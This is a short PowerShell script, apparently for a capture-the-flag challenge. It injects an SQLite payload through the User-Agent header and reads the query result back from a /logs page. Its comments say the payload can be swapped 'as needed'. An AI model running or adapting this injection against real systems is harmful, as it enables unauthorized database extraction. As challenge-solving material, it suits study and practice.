param(
    [string]$url = "AQUI_LA_URL_DEL_RETO_HOME", # Ejemplo: http://reto.com/
    [string]$logsUrl = "AQUI_LA_URL_DE_LOGS",   # Ejemplo: http://reto.com/logs
    [string]$payload = "MiPayload' || (SELECT sqlite_version()) || '" # Cambiar el payload según necesites
)

# 1. Enviar el payload a través del User-Agent
Write-Host "Enviando payload inyectado en el User-Agent..."
$headers = @{
    "User-Agent" = $payload
}

try {
    Invoke-WebRequest -Uri $url -Headers $headers -Method Get | Out-Null
} catch {
    # Ignoramos errores 500 que puedan ocurrir si rompemos la consulta SQL por un instante
}

# 2. Leer la ruta de logs para ver el resultado
Write-Host "Consultando /logs para ver la data extraída..."
$response = Invoke-WebRequest -Uri $logsUrl -Method Get
Write-Host "--- Resultado ---"
# Aquí podrías usar expresiones regulares si la página tiene mucho HTML
# o simplemente imprimir los últimos logs.
$response.Content | Select-String -Pattern "MiPayload" -Context 0,2
